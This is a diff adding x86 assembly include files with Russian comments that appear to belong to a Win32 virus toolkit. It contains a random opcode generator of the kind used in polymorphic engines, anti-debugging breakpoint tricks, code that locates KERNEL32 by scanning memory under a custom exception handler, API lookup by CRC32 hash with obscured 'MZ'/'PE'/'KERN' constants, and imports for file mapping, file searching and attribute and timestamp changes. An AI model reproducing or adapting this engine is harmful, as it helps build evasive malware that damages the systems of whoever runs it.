+                   ret
+;-----------------------------------------------
+
+GenRegF:        mov eax,7h     ;
+                call  RandEAX  ;
+                ret
+GenReg:        ; out  al=Reg#
+@L:             call GenRegF
+                cmp al,4       ;
+                je @L          ;
+                 ret
+MakeMOVeRg0xXXXXXXXX:
+                   ; input  al=Reg# (0..7)
+                   ;        edi=Dest
+                   ;   out  dl=Reg#
+                   mov dl,0b8h    ;
+                   add dl,al      ;
+                   xchg dl,al     ;
+                   cld            ;
+                   stosb          ;
+                   mov eax,esi
+                   cld            ;
+                   stosd          ;
+                   ret
+MakePush_eRg:
+                   ; input dl=Reg# (0..7)
+                   ;      edi=Dest
+                   mov al,50h     ;
+                   add al,dl      ;
+                   cld            ;
+                   stosb          ;
+                   ret
+MakePush0xXXXXXXXXEnd:
+===== end   dinav2.inc =====
+
+===== begin exeption.inc =====
+DEBUG   EQU 1  ; Так отладка возможна.
+NODEBUG EQU 0  ; А так затрудняется
+DEBUGFLAG EQU DEBUG
+
+         EXCEPTION_SINGLE_STEP EQU 080000004h
+         EXCEPTION_BREAKPOINT EQU 080000003h
+   EXCEPTION_ACCESS_VIOLATION EQU 0C0000005h
+EXCEPTION_ILLEGAL_INSTRUCTION EQU 0C000001Dh
+
+ IF DEBUGFLAG
+    EXEPTION EQU dw 0ffffh,090c3h,9090h
+    ELSE
+    EXEPTION EQU db 0cch
+ ENDIF
+ IF DEBUGFLAG
+  BreakPoint EQU db 0cch
+    ELSE
+  BreakPoint EQU ;
+ ENDIF
+
+callEx macro Arg
+       ; call Arg
+       push z&Arg
+       exeption
+       endm
+===== end   exeption.inc =====
+
+===== begin kern32vx.inc =====
+; last edit  07.07.2000  bug fix
+offset2 macro Arg,RelPoint
+offset2&Arg EQU offset Arg - offset RelPoint
+        endm
+; На входе EDI=Image Base VA.
+; Если EDI=0, то инициализируется KERNEL32.dll
+Kern32VxInit:   pusha
+                call @Kern32VxInitL1
+hKernelHahdler:   dd  ?
+lpExportTable:    dd  ?
+CRC32APIf         dd  ?
+@Kern32VxInitL1: pop ebx
+                 or edi,edi
+                 jne_ @@@L1
+                 call GetKernelHahdlerA
+                 @@@L1:
+                 mov [ebx],EDI
+                 mov [ebx+4],EDI
+                 mov eax,edi
+                 add eax,[eax+3ch] ; eax=offset 2 PE
+                 mov esi,[eax+78h] ; esi=Export Table RVA 2 USER32.dll
+                 add [ebx+4],esi
+                 mov eax,ebx
+                 offset2 Call_Win_AIP32,hKernelHahdler
+                 add eax,offset2Call_Win_AIP32
+                 mov [esp+1ch],eax
+                 popa
+                 pop ecx
+                 push eax
+                 xor eax,eax
+                 push dword ptr fs:[eax]
+                 mov fs:[eax],esp
+                 jmp ecx
+ ;-------------------------------------------------------------------------
+ ExeptionRecord   EQU  4
+ ExeptionAddress  EQU  0ch
+ ContextBlock     EQU  0ch
+ OldESPreg        EQU  0c4h
+ pushadd          EQU 20h
+Call_Win_AIP32: pusha
+		mov edx,[esp+pushadd+ExeptionRecord]
+                mov eax,[edx+ExeptionAddress]
+               IF DEBUGFLAG
+                add eax,3
+                cmp word ptr [eax-3],0ffffh
+               ELSE
+                add eax,1
+                cmp byte ptr [eax-1],0cch
+               ENDIF
+                jne NotKern32VXAPI ;
+                ;--------
+                 mov ebx,eax        ; ret point
+                 mov edx,[esp+pushadd+ContextBlock]
+                 mov eax,[edx+OldESPreg]
+                 mov ecx,eax
+                 mov eax,[eax]    ; Get CRC32
+                 mov [ecx],ebx    ; save  ret point
+                 call $+5
+Call_Win_AIP32L1: pop ebx
+                  sub ebx,offset Call_Win_AIP32L1-offset hKernelHahdler
+                  mov [ebx+8],eax ; API CRC32
+                  mov edi,[ebx]
+                  mov esi,[ebx+4]
+                  ;esi = Export Table
+                  mov ecx,[esi+18h] ;Num of Name Pointers
+                  mov edx,edi
+                  add edx,[esi+20h] ;Offset 2 Name Pointers RVA
+                  push ecx
+HEA_HE_OHA:       mov esi,edi
+                  add esi,[edx]  ; esi = Name of func
+                  call CRCSum
+                  cmp [ebx+8],eax
+                  je_ BOT_OHA
+                  add edx,4
+                  loop HEA_HE_OHA
+                  pop eax
+                  xor eax,eax
+                  jmp_ FuncNotFound
+          BOT_OHA: pop  eax
+                   sub eax,ecx       ; eax=#
+                   inc eax
+                   mov esi,[ebx+4]
+                   shl eax,1 ; *2
+                   mov edx,edi
+                   add edx,[esi+24h] ; Ordinal Table RVA
+                   mov ax,word ptr [edx+eax] ; Func Ordinal }|{                        }
+                   sub eax,[esi+10h] ; - Ordinal Base
+                   mov esi,[esi+1ch] ; Address Table RVA
+                   add esi,edi
+                   shl eax,2
+                   mov eax,[esi+eax]
+                   add eax,edi
+                   ; eax=ProcAdderss
+                   ;-----------------------------
+    FuncNotFound:  xor edx,edx
+                   xor ecx,ecx
+                   mov edx,fs:[edx]
+                   mov edx,[edx]
+                   mov fs:[ecx],edx
+                   ;-----------------------------
+                 OldEDIreg EQU 9ch
+                 mov esp,[esp+pushadd+ContextBlock]
+                 add esp,OldEDIreg
+                 pop edi
+                 pop esi
+                 pop ebx
+                 pop edx
+                 pop ecx
+                 add esp,4        ; skip eax
+                 pop ebp
+                 add esp,10h-4
+                 pop esp
+                 or eax,eax
+                 je_ FuncNotFoundL2
+                 jmp eax          ; GO GO GO !
+NotKern32VXAPI:  popa
+                 xor eax,eax
+                 inc eax   ; next ERR
+                 ret
+FuncNotFoundL2:  dec eax    ; eax=-1 В случае если нет такой CRC32
+                 ret
+;---------------------------------------------------------------------------
+; Процедура возвращает:
+;     EDI=KernelHahdler
+;--------------------------------------------------------------------------
+; Найдем кернел
+GetKernelHahdlerA:
+         push fs
+         pusha
+         call GetKernelHahdler
+
+         mov eax,[esp]          ; Получили указатель в Kernel32
+         mov esp,[esp+8]        ; CTEK наместо
+
+         xor edx,edx             ; ret old seh
+         pop dword ptr fs:[edx]  ;
+         pop edx                 ;
+
+         ; Теперь поищем MZ
+         xor edx,edx
+         mov ecx,1000h
+         div ecx
+         mul ecx
+         mov edi,eax
+         mov cx,('ZM'-1111h)
+         add cx,1111h
+SetMySEH:  call MySEH
+RetEDISize EQU  offset GdeMZK32 - offset @@GdeMZK32
+@@GdeMZK32:
+           mov esp,[esp+8]
+           mov edi,[esp-4]        ; Востановим после исключения.
+
+           xor eax,eax
+           pop dword ptr fs:[eax]
+           pop eax
+
+           mov cx,('ZM'-1111h)
+           add cx,1111h
+           jmp_ SetMySEH
+
+GdeMZK32: pop edi
+GdeMZ:   sub edi,1000h
+         push edi
+         mov ax,word ptr [edi]    ;
+         pop edi
+         cmp ax,cx                ;
+         je_ @MZ
+         jmp_ GdeMZ
+@MZ:     cmp byte ptr [edi+18h],40h;
+         jl_ GdeMZ                  ; Будем искать другой MZ
+         mov eax,dword ptr [edi+3ch]
+         mov cx,('EP'-2222h)
+         add cx,2222h
+         cmp word ptr [edi+eax],cx  ; Вроде PE ?
+         jne_ GdeMZ
+         ExportTable_RVA EQU 78h
+         Name_RVA        EQU 0ch
+         mov eax,[edi+eax+ExportTable_RVA]        ; ExportTable_RVA
+         mov eax,[edi+eax+Name_RVA]
+         push edi
+         add edi,eax                              ; edi=Имя модуля.
+         mov edx,('NREK'-11223344h) ; KERN
+         add edx,11223344h
+         cmp dword ptr [edi],edx
+         jne_ GdeMZK32              ; Ищем дальше ... кто ищет тот ...
+         pop edi                    ; EDI= Kernel32 Handler
+
+         xor edx,edx
+         pop dword ptr fs:[edx]
+         pop edx
+
+
+         rEDI_ EQU 0
+         rESI_ EQU 4
+         mov dword ptr [esp+rEDI_],edi
+         popa
+         pop fs
+         ret
+GetKernelHahdler:
+        xor eax,eax
+        push    dword ptr fs:[eax]
+        mov     fs:[eax],esp
+         ; Генерируем исключение
+         mov [eax],eax
+;-------------------------------------------------
+MySEH:   xor eax,eax
+         push    dword ptr fs:[eax] ;
+         mov     fs:[eax],esp       ;
+         mov eax,dword ptr [esp+4]
+         add eax,RetEDISize+1
+         jmp eax
+include crc32api.inc
+===== end   kern32vx.inc =====
+
+===== begin macro.inc =====
+offset2 macro Arg,RelPoint
+offset2&Arg EQU offset Arg - offset RelPoint
+        endm
+Dest macro Arg,RelPoint
+Arg  EQU offset Arg - offset RelPoint
+         endm
+jmp_  macro lab
+     local name
+      db 0ebh
+      db offset lab - offset name
+    name:
+     endm
+
+jl_  macro lab
+     local name
+      db 07ch
+      db offset lab - offset name
+    name:
+     endm
+jle_  macro lab
+     local name
+      db 07eh
+      db offset lab - offset name
+     name:
+     endm
+jnl_  macro lab
+     local name
+      db 07Dh
+      db offset lab - offset name
+    name:
+     endm
+jg_  macro lab
+     local name
+      db 07fh
+      db offset lab - offset name
+    name:
+     endm
+jne_  macro lab
+      local name
+      db 075h
+      db offset lab - offset name
+    name:
+     endm
+je_  macro lab
+     local name
+      db 074h
+      db offset lab - offset name
+    name:
+     endm
+===== end   macro.inc =====
+
+===== begin random.inc =====
+; Процедура генерации случайного слова в заданном интервале
+RandEAX:  pusha
+          push eax
+          call random
+          mov [esp+01ch],eax
+          popa
+          ret
+random:
+call @randomL1
+@randomL2:
+offset2RandSeed EQU offset RandSeed - offset @randomL2
+offset2ww       EQU offset ww - offset @randomL2
+RandSeed  dd 2394900h
+ww        dw 8405h
+@randomL1: pop edi
+xor eax,eax
+;mov ax,WORD PTR [edi+offset2RandSeed]
+db 66h,8bh,07h
+;mov bx,WORD PTR [edi+offset2RandSeed+2]
+db 66h,8bh,5fh,02h
+mov cx,ax
+;mul word ptr [edi+offset2ww]
+db 66h,0f7h,67h,04h
+SHL cx,1
+shl cx,1
+shl cx,1
+add dx,cx
+add dx,bx
+shl bx,1
+shl bx,1
+add dx,bx
+add dh,bl
+mov cl,05
+shl bx,cl
+add ax,0001
+adc dx,0
+;mov WORD PTR [edi+offset2RandSeed],ax
+db 66h,89h,07h
+;mov WORD PTR [edi+offset2RandSeed+2],dx
+db 66h,89h,57h,02h
+mov Ebx,Esp
+mov cx,dx
+mul ss:word ptr [Ebx+4]
+mov ax,cx
+mov cx,dx
+mul ss:word ptr [Ebx+4]
+add ax,cx
+adc dx,00
+mov ax,dx
+ret  4
+===== end   random.inc =====
+
+===== begin wvoodoo.inc =====
+NULL = 0
+; GlobalAlloc flags
+GMEM_FIXED      =   0000h
+GMEM_MOVEABLE   =   0002h
+GMEM_NOCOMPACT  =   0010h
+GMEM_NODISCARD  =   0020h
+GMEM_ZEROINIT   =   0040h
+GMEM_MODIFY     =   0080h
+GMEM_DISCARDABLE=   0100h
+GMEM_NOT_BANKED =   1000h
+GMEM_DDESHARE   =   2000h
+GMEM_SHARE      =   2000h
+GMEM_NOTIFY     =   4000h
+GMEM_LOWER      =   GMEM_NOT_BANKED
+GHND            =   GMEM_MOVEABLE+GMEM_ZEROINIT
+GPTR            =   GMEM_FIXED+GMEM_ZEROINIT
+;-----------
+ FILE_ATTRIBUTE_READONLY     =    00000001h
+ FILE_ATTRIBUTE_HIDDEN       =    00000002h
+ FILE_ATTRIBUTE_SYSTEM       =    00000004h
+ FILE_ATTRIBUTE_DIRECTORY    =    00000010h
+ FILE_ATTRIBUTE_ARCHIVE      =    00000020h
+ FILE_ATTRIBUTE_NORMAL       =    00000080h
+ FILE_ATTRIBUTE_TEMPORARY    =    00000100h
+;-----------
+FILE_FLAG_WRITE_THROUGH         = 80000000h
+FILE_FLAG_OVERLAPPED            = 40000000h
+FILE_FLAG_NO_BUFFERING          = 20000000h
+FILE_FLAG_RANDOM_ACCESS         = 10000000h
+FILE_FLAG_SEQUENTIAL_SCAN       = 08000000h
+FILE_FLAG_DELETE_ON_CLOSE       = 4000000h
+FILE_FLAG_BACKUP_SEMANTICS      = 02000000h
+FILE_FLAG_POSIX_SEMANTICS       = 01000000h
+
+;------------------------
+CREATE_NEW         = 1
+CREATE_ALWAYS      = 2
+OPEN_EXISTING      = 3
+OPEN_ALWAYS        = 4
+TRUNCATE_EXISTING  = 5
+
+;-----------
+GENERIC_READ               = 80000000h
+GENERIC_WRITE              = 40000000h
+FILE_SHARE_READ            = 00000001h
+FILE_SHARE_WRITE           = 00000002h
+;-----------
+ PAGE_NOACCESS          = 01h
+ PAGE_READONLY          = 02h
+ PAGE_READWRITE         = 04h
+ PAGE_WRITECOPY         = 08h
+ PAGE_EXECUTE           = 10h
+ PAGE_EXECUTE_READ      = 20h
+ PAGE_EXECUTE_READWRITE = 40h
+ PAGE_EXECUTE_WRITECOPY = 80h
+ PAGE_GUARD             = 100h
+ PAGE_NOCACHE           = 200h
+;-------------------
+FILE_MAP_WRITE = 2
+FILE_MAP_READ  = 4
+;-------------------
+ NORMAL_PRIORITY_CLASS      = 00000020h
+ IDLE_PRIORITY_CLASS        = 00000040h
+ HIGH_PRIORITY_CLASS        = 00000080h
+ REALTIME_PRIORITY_CLASS    = 00000100h
+;--------------------
+EXCEPTION_DEBUG_EVENT      = 1
+CREATE_THREAD_DEBUG_EVENT  = 2
+CREATE_PROCESS_DEBUG_EVENT = 3
+EXIT_THREAD_DEBUG_EVENT    = 4
+EXIT_PROCESS_DEBUG_EVENT   = 5
+LOAD_DLL_DEBUG_EVENT       = 6
+UNLOAD_DLL_DEBUG_EVENT     = 7
+OUTPUT_DEBUG_STRING_EVENT  = 8
+RIP_EVENT                  = 9
+;--------------------
+PROCESS_ALL_ACCESS  =   0F0000h or 00100000h or 0FFFh
+;--------------------locals
+        extrn   MessageBoxA:PROC
+        extrn   Sleep:PROC
+        extrn   ExitProcess:PROC
+        extrn   CreateThread:PROC
+        extrn   GetLastError:PROC
+        extrn   GetModuleHandleA:PROC
+        extrn   ExitProcess:PROC
+        extrn   GetProcAddress:PROC
+        extrn   GetModuleHandleA:PROC
+        extrn   GetCurrentThread:PROC
+        extrn   VirtualProtectEx:PROC
+        extrn   DebugActiveProcess:Proc
+        extrn   OpenProcess:PROC
+        extrn   WriteProcessMemory:PROC
+        extrn   SuspendThread:PROC
+        extrn   GetCurrentProcessId:PROC
+        extrn   LoadLibraryA:PROC
+        extrn   MessageBoxA:PROC
+        extrn   MessageBeep:PROC
+        extrn   GlobalAlloc:PROC ; retern HGLOBAL
+                ; UINT Flags  object allocation attributes
+                ; DWORD dwBytes mumber of bytes to allocate
+        extrn   GlobalLock:PROC ;Pointer to mem
+                ; HGLOBAL hMem address of global memory object
+        extrn   GlobalUnlock:PROC
+                ; HGLOBAL hMem address of global memory object
+        extrn   GlobalFree:PROC
+                ;HGlobal hMem handle to the global memory object
+     ;---- file mapping --------------------------------------
+      extrn CreateFileA:PROC
+     ;Retern HANDLE
+     ;Parametrs:    LPCTSTR :LpFileName
+     ;              DWORD   :dwDesiredAccess (read-write)
+     ;              DWORD   : dwShareMode
+     ; LPSECURITY_ATTRIBTES :LpSecurityAttrib address of security descriptor
+     ;              DWORD   :dwCreationDistribution //how to creat
+     ;              DWORD   :dwFlagsAndAttributes
+     ;             HANDLE   :hTemplateFile //handle of file with attrib to copy
+     extrn CreateFileMappingA:PROC
+     ;Retern HANDLE
+     ; PARAMMETRS    HANDLE :hfile    //handle of file map
+     ;  LpSecurity_Attributes LpFileMappingAttributes //optional security attrib
+     ;  Dword  :flProtect
+     ;  Dword  :dwMaxSizeHigh
+     ;  Dword  :dwMaxSizeLow
+     ; LPCTSTR :lpName //name of file-mapping object
+     extrn MapViewOfFile:PROC ;(hFileMappingObject:HANDLE,
+                              ;  dwDesiredAccess:dw,
+                              ;  dwFileOffsetHigh,
+                              ;  dwFileOffsetLow,
+                              ;  dwNumberOfBytesToMap)
+     ;
+     ;
+     ;
+     extrn UnmapViewOfFile:PROC
+     extrn CloseHandle:PROC
+     extrn FlushViewOfFile:PROC;(LpBaseAddress,dwNumberOfBytesToFlush)
+    ;--------------------------------------------------------
+     extrn GetFileSize:PROC ; (hFile,LPDWORD LpFileSizeHigh)
+     extrn CopyFileA:PROC ;(LpExistingFileName,LpNewFileName)
+     extrn ReadFile:PROC  ;(hFile,LpBuffer,nMumberOfBytesToRead,
+     ;                    LpNumberOfBytesRead,LpOverlapped)
+     extrn DeleteFileA    :PROC;(LpFileName)
+     extrn GetLastError  :PROC;
+     extrn CreateProcessA:PROC;
+     extrn CreateProcessW:PROC;
+     extrn CreateFileW:PROC;
+     extrn GetStartupInfoA:PROC;
+     extrn GetCommandLineA:PROC;
+     extrn lstrcpyA:PROC;
+     extrn   FindFirstFileA:PROC
+     extrn   FindNextFileA:PROC
+     extrn   Sleep:PROC ;(dwMilliseconds)
+     extrn SetFileAttributesA:PROC;(LpFileName,dwFileAttributes)
+     extrn SetFileTime:PROC;
+     extrn SetCurrentDirectoryA:PROC;
+     extrn GetCurrentDirectoryA:PROC;
+     extrn GetExitCodeProcess:PROC;
+     extrn GetSystemTime:PROC;
+===== end   wvoodoo.inc =====
